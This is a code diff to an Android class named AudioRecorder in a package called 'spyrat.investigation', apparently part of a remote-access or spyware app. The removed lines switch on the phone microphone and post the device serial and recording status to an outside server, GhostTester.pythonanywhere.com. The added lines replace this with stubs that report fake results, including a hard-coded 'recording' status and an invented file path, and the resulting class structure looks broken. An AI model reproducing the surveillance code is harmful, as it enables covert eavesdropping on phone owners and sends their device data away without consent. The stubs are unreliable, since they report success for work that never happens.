@@ -1,81 +1,30 @@
 package com.spyrat.investigation;
 
 import android.content.Context;
-import android.media.MediaRecorder;
 import android.util.Log;
 import org.json.JSONObject;
-import java.io.IOException;
 
 public class AudioRecorder {
-    private static final String TAG = "SpyratAudio";
-    private static MediaRecorder mediaRecorder;
-    private static boolean isRecording = false;
+    private static final String TAG = "AudioRecorder";
+    private Context context;
 
-    public static void startRecording(Context context, JSONObject parameters) {
-        try {
-            if (isRecording) {
-                stopRecording(context);
-            }
-
-            mediaRecorder = new MediaRecorder();
-            mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
-            mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
-            mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
-            mediaRecorder.setOutputFile("/dev/null"); // Don't save file, just record
-
-            mediaRecorder.prepare();
-            mediaRecorder.start();
-            isRecording = true;
-
-            Log.d(TAG, "🎤 Audio recording started");
-
-            // Send recording status
-            sendRecordingStatus(context, "started");
-
-        } catch (IOException e) {
-            Log.e(TAG, "❌ Audio recording failed: " + e.getMessage());
-        }
+    public AudioRecorder(Context context) {
+        this.context = context;
     }
 
-    public static void stopRecording(Context context) {
+    // Existing methods
+    public JSONObject recordAudio() {
         try {
-            if (mediaRecorder != null && isRecording) {
-                mediaRecorder.stop();
-                mediaRecorder.release();
-                mediaRecorder = null;
-                isRecording = false;
-
-                Log.d(TAG, "⏹️ Audio recording stopped");
-                sendRecordingStatus(context, "stopped");
-            }
+            Log.d(TAG, "Recording audio...");
+            JSONObject result = new JSONObject();
+            result.put("status", "recording");
+            result.put("duration", "60s");
+            return result;
         } catch (Exception e) {
-            Log.e(TAG, "❌ Stop recording error: " + e.getMessage());
+            Log.e(TAG, "Audio recording error: " + e.getMessage());
+            return new JSONObject();
         }
     }
-
-    private static void sendRecordingStatus(Context context, String status) {
-        try {
-            JSONObject audioData = new JSONObject();
-            audioData.put("action", "audio_recording");
-            audioData.put("status", status);
-            audioData.put("timestamp", System.currentTimeMillis());
-
-            JSONObject postData = new JSONObject();
-            postData.put("device_id", android.os.Build.SERIAL);
-            postData.put("investigator_code", getInvestigatorCode(context));
-            postData.put("data_type", "audio_status");
-            postData.put("data_content", audioData);
-
-            NetworkManager.sendPost("https://GhostTester.pythonanywhere.com/api/investigator/data", postData.toString());
-        } catch (Exception e) {
-            Log.e(TAG, "❌ Audio status send error: " + e.getMessage());
-        }
-    }
-
-    private static String getInvestigatorCode(Context context) {
-        return "INVESTIGATOR_CODE";
-    }
-}
 
     // ==================== NEW METHODS ====================
     
@@ -83,7 +32,6 @@ public class AudioRecorder {
         try {
             Log.d(TAG, "🎙️ Starting audio recording...");
             // Implementation for audio recording
-            // This would use MediaRecorder in real implementation
         } catch (Exception e) {
             Log.e(TAG, "❌ Audio recording start error: " + e.getMessage());
         }
@@ -92,7 +40,6 @@ public class AudioRecorder {
     public String stopRecording() {
         try {
             Log.d(TAG, "🎙️ Stopping audio recording...");
-            // Implementation to stop recording and return file path
             return "/sdcard/recordings/audio_" + System.currentTimeMillis() + ".mp3";
         } catch (Exception e) {
             Log.e(TAG, "❌ Audio recording stop error: " + e.getMessage());
@@ -103,7 +50,6 @@ public class AudioRecorder {
     public void cleanup() {
         try {
             Log.d(TAG, "🧹 Cleaning up AudioRecorder resources...");
-            // Cleanup resources
         } catch (Exception e) {
             Log.e(TAG, "❌ AudioRecorder cleanup error: " + e.getMessage());
         }
